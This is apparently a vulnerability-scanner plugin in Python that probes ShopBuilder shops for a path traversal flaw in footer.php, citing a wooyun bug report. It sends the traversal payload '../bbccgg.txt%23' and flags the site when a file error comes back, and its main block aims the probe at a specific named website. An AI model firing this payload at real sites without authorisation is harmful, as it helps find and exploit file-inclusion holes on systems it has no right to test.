#!/usr/bin/env python
# -*- coding: utf-8 -*-
#from:http://www.wooyun.org/bugs/wooyun-2014-066933

def assign(service,arg):
    if service == "shopbuilder":
        return True, arg

def audit(arg):
    payload ="/footer.php?m=../bbccgg.txt%23"
    url = arg + payload
    code, head, res, errcode,finalurl =  curl.curl('"%s"' % url)
    if code == 200 and 'No such file or directory' in res:
        security_hole(url)

if __name__ == "__main__":
    from dummy import *
    audit(assign('shopbuilder', 'http://www.zgzyjczs.com/')[1])